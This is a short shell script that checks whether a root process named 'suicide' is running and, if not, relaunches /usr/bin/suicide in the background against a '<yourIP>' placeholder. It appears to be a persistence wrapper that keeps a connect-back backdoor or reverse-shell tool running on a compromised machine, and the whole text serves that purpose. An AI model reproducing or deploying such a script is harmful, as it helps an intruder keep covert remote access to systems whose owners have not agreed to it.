#!/bin/sh
if pgrep -u root suicide ; then
        exit 0
else
        /usr/bin/suicide <yourIP> 1 5 & 
        exit 0
fi
